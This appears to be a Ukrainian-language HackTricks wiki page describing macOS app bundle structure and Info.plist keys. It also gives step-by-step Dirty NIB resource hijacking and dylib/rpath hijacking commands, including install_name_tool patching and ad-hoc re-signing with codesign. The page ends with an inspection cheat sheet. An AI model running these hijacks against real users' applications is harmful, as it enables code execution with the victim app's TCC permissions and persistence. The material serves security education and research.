# Бандли macOS

{{#include ../../../banners/hacktricks-training.md}}

## Основна інформація

Бандли в macOS слугують контейнерами для різноманітних ресурсів, зокрема застосунків, бібліотек та інших необхідних файлів, завдяки чому у Finder вони відображаються як окремі об’єкти, наприклад знайомі файли `*.app`. Найпоширенішим бандлом є бандл `.app`, хоча також часто використовуються такі типи, як `.framework`, `.systemextension` і `.kext`.

### Основні компоненти бандла

Усередині бандла, зокрема в каталозі `<application>.app/Contents/`, містяться різноманітні важливі ресурси:

- **\_CodeSignature**: Цей каталог зберігає дані code-signing, необхідні для перевірки цілісності застосунку. Переглянути інформацію про code-signing можна за допомогою таких команд:
```bash
openssl dgst -binary -sha1 /Applications/Safari.app/Contents/Resources/Assets.car | openssl base64
```
- **MacOS**: Містить виконуваний бінарний файл застосунку, який запускається після взаємодії з користувачем.
- **Resources**: Репозиторій компонентів інтерфейсу користувача застосунку, зокрема зображень, документів і описів інтерфейсу (файлів nib/xib).
- **Info.plist**: Виконує роль основного конфігураційного файлу застосунку, необхідного для того, щоб система могла належним чином розпізнавати застосунок і взаємодіяти з ним.

#### Важливі ключі в Info.plist

Файл `Info.plist` є основою конфігурації застосунку та містить такі ключі:

- **CFBundleExecutable**: Визначає назву основного виконуваного файлу, розташованого в каталозі `Contents/MacOS`.
- **CFBundleIdentifier**: Надає застосунку глобальний ідентифікатор, який macOS широко використовує для керування застосунками.
- **LSMinimumSystemVersion**: Вказує мінімальну версію macOS, необхідну для запуску застосунку.

### Дослідження бандлів

Для дослідження вмісту бандла, наприклад `Safari.app`, можна використати таку команду: `bash ls -lR /Applications/Safari.app/Contents`

Це дослідження виявляє такі каталоги, як `_CodeSignature`, `MacOS`, `Resources`, і такі файли, як `Info.plist`. Кожен із них має окреме призначення: від захисту застосунку до визначення його інтерфейсу користувача та операційних параметрів.

#### Додаткові каталоги бандла

Окрім поширених каталогів, бандли також можуть містити:

- **Frameworks**: Містить фреймворки, вбудовані в застосунок. Фреймворки подібні до dylib, але містять додаткові ресурси.
- **PlugIns**: Каталог для plug-ins і розширень, які збільшують можливості застосунку.
- **XPCServices**: Містить XPC-сервіси, які використовуються застосунком для міжпроцесної комунікації.

Ця структура забезпечує інкапсуляцію всіх необхідних компонентів у бандлі, створюючи модульне та безпечне середовище застосунку.

Докладнішу інформацію про ключі `Info.plist` та їхні значення можна знайти в документації Apple для розробників: [Apple Info.plist Key Reference](https://developer.apple.com/library/archive/documentation/General/Reference/InfoPlistKeyReference/Introduction/Introduction.html).<sup>[[3]](#references)</sup>

## Примітки щодо безпеки та вектори зловживання

- **Gatekeeper / App Translocation**: Коли бандл із quarantine запускається вперше, macOS виконує глибоку перевірку підпису та може запустити його з рандомізованого translocated-шляху. Після прийняття під час наступних запусків виконуються лише поверхневі перевірки; файли ресурсів у `Resources/`, `PlugIns/`, nib тощо історично не перевірялися. Починаючи з macOS 13 Ventura, під час першого запуску виконується глибока перевірка, а новий дозвіл TCC *App Management* обмежує сторонні процеси від модифікації інших бандлів без згоди користувача, однак старі системи залишаються вразливими.
- **Колізії Bundle Identifier**: Кілька вбудованих targets (PlugIns, helper tools), які повторно використовують той самий `CFBundleIdentifier`, можуть порушити перевірку підпису та іноді уможливити hijacking/confusion URL-схем. Завжди перераховуйте вкладені бандли й перевіряйте унікальність ідентифікаторів.

## Resource Hijacking (Dirty NIB / NIB Injection)

До появи Ventura заміна UI-ресурсів у підписаному застосунку могла обходити поверхневу перевірку code signing і забезпечувати code execution із entitlements застосунку. Сучасні дослідження (2024) показують, що це все ще працює на системах до Ventura та у збірках без quarantine:<sup>[[1]](#references)[[2]](#references)</sup>

1. Скопіюйте цільовий застосунок у доступне для запису розташування (наприклад, `/tmp/Victim.app`).
2. Замініть `Contents/Resources/MainMenu.nib` (або будь-який nib, оголошений у `NSMainNibFile`) на шкідливий, який створює екземпляри `NSAppleScript`, `NSTask` тощо.
3. Запустіть застосунок. Шкідливий nib виконується в контексті bundle ID та entitlements жертви (дозволи TCC, мікрофон/камера тощо).
4. Ventura+ застосовує deep verification бандла під час першого запуску та вимагає дозвіл *App Management* для подальших модифікацій, тому persistence стає складнішим, але атаки під час першого запуску на старих версіях macOS усе ще можливі.<sup>[[1]](#references)</sup>

Мінімальний приклад payload для шкідливого nib (скомпілюйте xib у nib за допомогою `ibtool`):
```bash
# create a nib that runs osascript -e 'do shell script "id"'
# ...build xib in Xcode, then
ibtool --compile MainMenu.nib MainMenu.xib
cp MainMenu.nib /tmp/Victim.app/Contents/Resources/
open /tmp/Victim.app
```
## Framework / PlugIn / dylib Hijacking всередині Bundles

Оскільки під час пошуку `@rpath` перевага надається Frameworks/PlugIns, що входять до складу bundle, розміщення malicious library всередині `Contents/Frameworks/` або `Contents/PlugIns/` може змінити порядок завантаження, якщо основний binary підписаний без library validation або зі слабким порядком `LC_RPATH`.

Типові кроки під час використання unsigned/ad-hoc bundle:
```bash
cp evil.dylib /tmp/Victim.app/Contents/Frameworks/
install_name_tool -add_rpath @executable_path/../Frameworks /tmp/Victim.app/Contents/MacOS/Victim
# or patch an existing load command
install_name_tool -change @rpath/Legit.dylib @rpath/evil.dylib /tmp/Victim.app/Contents/MacOS/Victim
codesign -f -s - --timestamp=none /tmp/Victim.app/Contents/Frameworks/evil.dylib
codesign -f -s - --deep --timestamp=none /tmp/Victim.app
open /tmp/Victim.app
```
Примітки:
- Hardened runtime без `com.apple.security.cs.disable-library-validation` блокує сторонні dylibs; спочатку перевірте entitlements.
- XPC services у `Contents/XPCServices/` часто завантажують sibling frameworks — аналогічно патчте їхні binaries для persistence або privilege escalation paths.

## Шпаргалка для швидкої перевірки
```bash
# list top-level bundle metadata
/usr/libexec/PlistBuddy -c "Print :CFBundleIdentifier" /Applications/App.app/Contents/Info.plist

# enumerate embedded bundles
find /Applications/App.app/Contents -name "*.app" -o -name "*.framework" -o -name "*.plugin" -o -name "*.xpc"

# verify code signature depth
codesign --verify --deep --strict /Applications/App.app && echo OK

# show rpaths and linked libs
otool -l /Applications/App.app/Contents/MacOS/App | grep -A2 RPATH
otool -L /Applications/App.app/Contents/MacOS/App
```
## Посилання

- [1] [Виводимо process injection на поверхню: exploitation macOS apps за допомогою nib files (2024)](https://sector7.computest.nl/post/2024-04-bringing-process-injection-into-view-exploiting-all-macos-apps-using-nib-files/)
- [2] [Dirty NIB і write-up про підміну ресурсів bundle (2024)](https://karol-mazurek.medium.com/snake-apple-app-bundle-ext-f5c43a3c84c4)
- [3] [Apple Developer - Довідник ключів Apple Info.plist](https://developer.apple.com/library/archive/documentation/General/Reference/InfoPlistKeyReference/Introduction/Introduction.html)

{{#include ../../../banners/hacktricks-training.md}}
